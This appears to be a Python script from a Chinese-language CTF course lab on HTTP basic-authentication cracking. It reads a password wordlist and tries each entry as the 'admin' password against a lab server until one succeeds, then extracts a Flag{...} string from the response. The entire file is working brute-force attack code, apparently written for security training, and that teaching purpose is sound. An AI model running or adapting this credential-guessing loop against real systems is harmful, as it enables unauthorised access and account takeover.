import re
import requests
import http_vlue as hv

print("物智学院CTF平台")
print("课程：漏洞扫描与安全审计")
print("实验6_http基本认证破解")
# 目标 URL
url = 'http://10.68.6.202:'
# 密码字典文件路径
passwords_file = input('请输入密码字典文件路径：')  # 替换为实际的密码字典文件路径
port=input('请输入端口号：')
username='admin'
# 定义标志（Flag）的正则表达式模式
flag_pattern = r'Flag\{([\w-]+)\}'
if hv.get_qx():
    try:
        # 打开密码字典文件并逐行读取密码
        with open(passwords_file, 'r') as f:
            for password in f:
                password = password.strip()  # 去除密码两端的空白字符
                # 尝试使用当前密码进行认证
                response = requests.get(url+port, auth=(username, password))  # 替换 'username' 为实际用户名
                if response.status_code == 200:
                    print(f"成功找到正确的用户名和密码：username: {username}, password: {password}")
                    # 使用正则表达式查找标志
                    match = re.search(flag_pattern, response.text)
                    if match:
                        flag = match.group(0)
                        print("这个似乎是你的答案:", flag)
                        input("请按回车键继续...")
                    else:
                        print("未找到 Flag")
                        input("请按回车键继续...")
                    break
                else:
                    print(f"尝试密码 {password} 失败")
            # 如果未找到正确的用户名和密码
            else:
                print("未找到正确的用户名和密码")
                input("请按回车键继续...")

    except IOError:
        print("无法打开密码字典文件，请检查文件路径是否正确。")
        input("请按回车键继续...")
else:
    print("失败，原因：权限不足！")
    input("请按回车键继续...")
